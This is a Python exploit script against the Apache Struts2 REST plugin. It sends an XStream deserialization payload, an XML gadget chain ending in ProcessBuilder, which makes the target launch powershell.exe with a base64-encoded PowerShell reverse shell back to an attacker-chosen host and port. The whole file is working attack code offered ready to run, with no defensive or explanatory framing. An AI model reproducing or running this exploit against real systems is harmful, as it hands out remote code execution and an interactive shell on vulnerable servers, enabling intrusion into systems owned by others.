#!/usr/bin/env python
import requests
import argparse
from base64 import b64encode

parser = argparse.ArgumentParser()
parser.add_argument('--lhost', '-l', help='LHOST - Your attack machine IP', type=str, required=True)
parser.add_argument('--lport', '-p', help='LPORT - Your attack machine Port', type=str, required=True)
parser.add_argument('--url', '-u', help='The target URL, example: http://127.0.0.1:8080/struts2-rest-showcase/orders/3', type=str, required=True)

args = parser.parse_args()

#POST Headers
headers = {
    'Content-Type': 'application/xml',
    'Connection': 'close',
}

#Sets the ip and port variables
ip = args.lhost
port = args.lport
ipport = ip + ":" + port

#Sets the url variable
url = args.url

print("[+] Trying to get a reverse shell using Powershell on " + ipport)

#This is the Powershell reverse shell command - feel free to change as needed
#Be aware this payload isnt calling Powershell as that is done in the XML (line 56)
#For example: powershell.exe -nop -e <payload>
payload = "$client = New-Object System.Net.Sockets.TCPClient('" + ip + "'," + port + ");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

#The command is base64 encoded in UTF-16LE
payload = b64encode(payload.encode('UTF-16LE'))

#This is the XML you need to send
data = """
<map>
  <entry>
      <jdk.nashorn.internal.objects.NativeString>
            <flags>0</flags>
            <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data">
            <dataHandler>
            	<dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource">
                	<is class="javax.crypto.CipherInputStream">
                    	<cipher class="javax.crypto.NullCipher">
                        	<initialized>false</initialized>
                            <opmode>0</opmode>
                            <serviceIterator class="javax.imageio.spi.FilterIterator">
                            	<iter class="javax.imageio.spi.FilterIterator">
                                	<iter class="java.util.Collections$EmptyIterator"/>
                                    <next class="java.lang.ProcessBuilder">
                                    	<command>
                                        	<string>powershell.exe</string>
                                            <string>-nop</string>
                                            <string>-e</string>
                                            <string>""" + payload + """\n</string>
                                        </command>
                                        <redirectErrorStream>false</redirectErrorStream>
                                    </next>                  
                                </iter>
                                <filter class="javax.imageio.ImageIO$ContainsFilter">
                                	<method>
                                	    <class>java.lang.ProcessBuilder</class>
                                	    <name>start</name>
                                	    <parameter-types/>
                                	</method>
                                	<name>mwxNZJ805CPS7DKLm1rUgET1</name>
                                </filter>
                                <next class="string">xkruIdjzook1CwMqglq04G0rmN0Sz</next>
                            </serviceIterator>                
                            <lock/>
                        </cipher>              
                        <input class="java.lang.ProcessBuilder$NullInputStream"/>
                        <ibuffer></ibuffer>
                        <done>false</done>
                        <ostart>0</ostart>
                        <ofinish>0</ofinish>
                        <closed>false</closed>
                    </is>            
                    <consumed>false</consumed>
                </dataSource>
            	<transferFlavors/>
            </dataHandler>
            <dataLen>0</dataLen>
	        </value>
	    </jdk.nashorn.internal.objects.NativeString>
	    <jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/>
	</entry>
	<entry>
		<jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
		<jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
	</entry>
</map>"""

response = requests.post(url, headers=headers, data=data, verify=False)

print("[+] Check your listener")
